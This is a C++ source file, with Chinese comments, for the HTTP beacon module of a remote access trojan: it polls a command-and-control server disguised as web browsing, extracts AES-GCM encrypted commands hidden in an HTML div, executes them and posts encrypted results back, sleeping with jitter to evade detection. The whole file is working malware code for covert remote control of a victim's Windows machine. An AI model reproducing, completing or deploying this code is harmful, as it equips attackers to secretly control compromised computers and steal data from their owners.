// beacon.cpp — Agent HTTP 轮询实现（协议 §8）
// 流量收敛为周期性 GET/POST，无长连接；伪装成网页浏览。
#include "pch.h"
#include "beacon.h"

#include "cmd_dispatch.h"
#include "crypto.h"
#include "protocol.h"
#include "session.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winhttp.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

namespace c2 {

    namespace {

        constexpr char kBeaconInfo[] = "rat-beacon-v1";   // HKDF info（协议 §8.2）
        constexpr char kTokenOpen[] = "<div id=\"token\">";
        constexpr char kTokenClose[] = "</div>";
        constexpr int kHttpTimeoutMs = 15000;             // 每轮请求内部超时（§8.6）

        // ---- base64（自实现，避免外部依赖）----

        std::string base64_encode(const uint8_t* data, size_t len) {
            static const char* t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::string out;
            out.reserve((len + 2) / 3 * 4);
            for (size_t i = 0; i < len; i += 3) {
                uint32_t v = (uint32_t)data[i] << 16;
                if (i + 1 < len) v |= (uint32_t)data[i + 1] << 8;
                if (i + 2 < len) v |= data[i + 2];
                out.push_back(t[(v >> 18) & 63]);
                out.push_back(t[(v >> 12) & 63]);
                out.push_back(i + 1 < len ? t[(v >> 6) & 63] : '=');
                out.push_back(i + 2 < len ? t[v & 63] : '=');
            }
            return out;
        }

        bool base64_decode(const std::string& in, std::vector<uint8_t>& out) {
            auto val = [](char c) -> int {
                if (c >= 'A' && c <= 'Z') return c - 'A';
                if (c >= 'a' && c <= 'z') return c - 'a' + 26;
                if (c >= '0' && c <= '9') return c - '0' + 52;
                if (c == '+') return 62;
                if (c == '/') return 63;
                return -1;
                };
            out.clear();
            uint32_t buf = 0;
            int bits = 0;
            for (char c : in) {
                if (c == '=' || c == '\r' || c == '\n')
                    continue;
                int v = val(c);
                if (v < 0)
                    return false;
                buf = (buf << 6) | (uint32_t)v;
                bits += 6;
                if (bits >= 8) {
                    bits -= 8;
                    out.push_back((uint8_t)((buf >> bits) & 0xFF));
                }
            }
            return true;
        }

        // ---- HTTP 原语（WinHTTP）----

        // form-urlencoded 转义（base64 的 +/= 在 form 中需转义）
        std::string url_encode(const std::string& s) {
            static const char* hex = "0123456789ABCDEF";
            std::string out;
            for (unsigned char c : s) {
                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                    (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
                    out.push_back((char)c);
                }
                else {
                    out.push_back('%');
                    out.push_back(hex[c >> 4]);
                    out.push_back(hex[c & 15]);
                }
            }
            return out;
        }

        std::wstring to_wide(const std::string& s) {
            int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
            std::wstring w(n, 0);
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], n);
            return w;
        }

        // 发起一次 HTTP 请求，返回响应 body；失败返回 false。
        bool http_request(const std::string& host, uint16_t port,
            const std::string& method, const std::string& path,
            const std::string& cookie, const std::string& body,
            std::string& out_body) {
            HINTERNET hSession = WinHttpOpen(L"RatBeacon/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession)
                return false;
            std::wstring whost = to_wide(host);
            HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), port, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                return false;
            }
            std::wstring wmethod = to_wide(method);
            std::wstring wpath = to_wide(path);
            HINTERNET hReq = WinHttpOpenRequest(hConnect, wmethod.c_str(), wpath.c_str(),
                nullptr, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hReq) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return false;
            }
            WinHttpSetTimeouts(hReq, kHttpTimeoutMs, kHttpTimeoutMs,
                kHttpTimeoutMs, kHttpTimeoutMs);

            if (!cookie.empty()) {
                std::string hdr = "Cookie: " + cookie;
                WinHttpAddRequestHeaders(hReq, to_wide(hdr).c_str(), (DWORD)-1,
                    WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
            }
            if (!body.empty()) {
                std::string ct = "Content-Type: application/x-www-form-urlencoded";
                WinHttpAddRequestHeaders(hReq, to_wide(ct).c_str(), (DWORD)-1,
                    WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
            }

            bool ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.data(),
                (DWORD)body.size(), (DWORD)body.size(), 0) != FALSE &&
                WinHttpReceiveResponse(hReq, nullptr) != FALSE;
            // 校验 HTTP 状态码（非 2xx 视为失败）
            if (ok) {
                DWORD code = 0, codeLen = sizeof(code);
                if (WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    WINHTTP_HEADER_NAME_BY_INDEX, &code, &codeLen,
                    WINHTTP_NO_HEADER_INDEX)) {
                    ok = code >= 200 && code < 300;
                }
            }
            if (ok) {
                out_body.clear();
                char buf[4096];
                DWORD n = 0;
                while (WinHttpReadData(hReq, buf, sizeof(buf), &n) && n > 0) {
                    out_body.append(buf, n);
                    n = 0;
                }
            }
            WinHttpCloseHandle(hReq);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return ok;
        }

        // ---- 命令/结果 TLV（协议 §8.4/§8.5，little-endian）----

        struct BeaconCmd {
            uint32_t seq = 0;
            uint16_t cmd = 0;
            std::vector<uint8_t> payload;
        };

        struct BeaconResult {
            uint32_t seq = 0;
            uint8_t status = 0;
            std::vector<uint8_t> result;
        };

        void put_u32(std::vector<uint8_t>& v, uint32_t x) {
            for (int i = 0; i < 4; ++i)
                v.push_back((uint8_t)(x >> (8 * i)));
        }

        void put_u16(std::vector<uint8_t>& v, uint16_t x) {
            v.push_back((uint8_t)(x & 0xFF));
            v.push_back((uint8_t)(x >> 8));
        }

        bool get_u32(const uint8_t* p, size_t avail, uint32_t& out) {
            if (avail < 4)
                return false;
            out = (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
            return true;
        }

        bool get_u16(const uint8_t* p, size_t avail, uint16_t& out) {
            if (avail < 2)
                return false;
            out = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
            return true;
        }

        // 解析命令块 → 命令列表
        bool parse_commands(const std::vector<uint8_t>& plain, std::vector<BeaconCmd>& out) {
            size_t off = 0;
            uint32_t count = 0;
            if (!get_u32(plain.data(), plain.size(), count))
                return false;
            off = 4;
            for (uint32_t i = 0; i < count; ++i) {
                BeaconCmd c;
                if (!get_u32(plain.data() + off, plain.size() - off, c.seq))
                    return false;
                off += 4;
                if (!get_u16(plain.data() + off, plain.size() - off, c.cmd))
                    return false;
                off += 2;
                uint32_t len = 0;
                if (!get_u32(plain.data() + off, plain.size() - off, len))
                    return false;
                off += 4;
                if (off + len > plain.size())
                    return false;
                c.payload.assign(plain.begin() + off, plain.begin() + off + len);
                off += len;
                out.push_back(std::move(c));
            }
            return true;
        }

        // 编码结果块
        std::vector<uint8_t> encode_results(const std::vector<BeaconResult>& results) {
            std::vector<uint8_t> out;
            put_u32(out, (uint32_t)results.size());
            for (const auto& r : results) {
                put_u32(out, r.seq);
                out.push_back(r.status);
                put_u32(out, (uint32_t)r.result.size());
                out.insert(out.end(), r.result.begin(), r.result.end());
            }
            return out;
        }

        // 从伪装 HTML 中提取 <div id="token">...</div> 内容
        bool extract_token(const std::string& html, std::string& token) {
            size_t a = html.find(kTokenOpen);
            if (a == std::string::npos)
                return false;
            a += std::strlen(kTokenOpen);
            size_t b = html.find(kTokenClose, a);
            if (b == std::string::npos)
                return false;
            token = html.substr(a, b - a);
            return !token.empty();
        }

    }  // namespace

    void run_beacon(const std::string& host, uint16_t port,
        const AgentConfig& cfg, const uint8_t* beacon_key,
        int sleeptime) {
        // Cookie：SID=<agent_id_hex>
        std::string sid;
        for (int i = 0; i < 16; ++i) {
            char b[3];
            snprintf(b, sizeof(b), "%02x", cfg.agent_id[i]);
            sid += b;
        }
        const std::string cookie = "SID=" + sid;

        std::vector<BeaconResult> pending;  // 待上传结果（下次轮询 POST）
        printf("[beacon] started host=%s:%u sleeptime=%ds cookie=%s\n",
            host.c_str(), port, sleeptime, sid.c_str());

        for (;;) {
            // ① POST 待上传结果
            if (!pending.empty()) {
                std::vector<uint8_t> plain = encode_results(pending);
                std::vector<uint8_t> sealed;
                std::string err;
                printf("[beacon] posting %zu results...\n", pending.size());
                if (aes_gcm_encrypt(beacon_key, 32, plain.data(), plain.size(), sealed, err)) {
                    std::string body = "data=" + url_encode(base64_encode(sealed.data(), sealed.size()));
                    std::string resp;
                    if (http_request(host, port, "POST", "/submit", cookie, body, resp)) {
                        pending.clear();  // 上传成功才清空
                        printf("[beacon] results posted ok\n");
                    }
                    else {
                        printf("[beacon] POST failed\n");
                    }
                }
                else {
                    printf("[beacon] encrypt results failed\n");
                }
            }

            // ② GET 取命令
            std::string html;
            if (http_request(host, port, "GET", "/", cookie, "", html)) {
                std::string token;
                if (extract_token(html, token)) {
                    std::vector<uint8_t> sealed;
                    if (base64_decode(token, sealed)) {
                        std::vector<uint8_t> plain;
                        std::string err;
                        if (aes_gcm_decrypt(beacon_key, 32, sealed.data(), sealed.size(),
                            plain, err)) {
                            std::vector<BeaconCmd> cmds;
                            if (parse_commands(plain, cmds)) {
                                printf("[beacon] got %zu cmds\n", cmds.size());
                                for (const auto& c : cmds) {
                                    uint8_t status = 0;
                                    std::vector<uint8_t> resp;
                                    handle_command(c.cmd, c.payload.data(), c.payload.size(),
                                        resp, status);
                                    printf("[beacon] exec cmd=0x%04x seq=%u status=%u len=%zu\n",
                                        c.cmd, c.seq, status, resp.size());
                                    pending.push_back(
                                        BeaconResult{ c.seq, status, std::move(resp) });
                                }
                            }
                            else {
                                printf("[beacon] parse commands failed\n");
                            }
                        }
                        else {
                            printf("[beacon] decrypt token failed: %s\n", err.c_str());
                        }
                    }
                    else {
                        printf("[beacon] base64 decode failed\n");
                    }
                }
            }

            // ③ sleep(sleeptime ± 20% jitter)
            int jitter = sleeptime > 0 ? (sleeptime * 20 + 99) / 100 : 0;  // 20%
            int actual = sleeptime;
            if (sleeptime > 0)
                actual = sleeptime + (rand() % (2 * jitter + 1)) - jitter;
            if (actual < 1)
                actual = 1;
            Sleep((DWORD)actual * 1000);
        }
    }

}  // namespace c2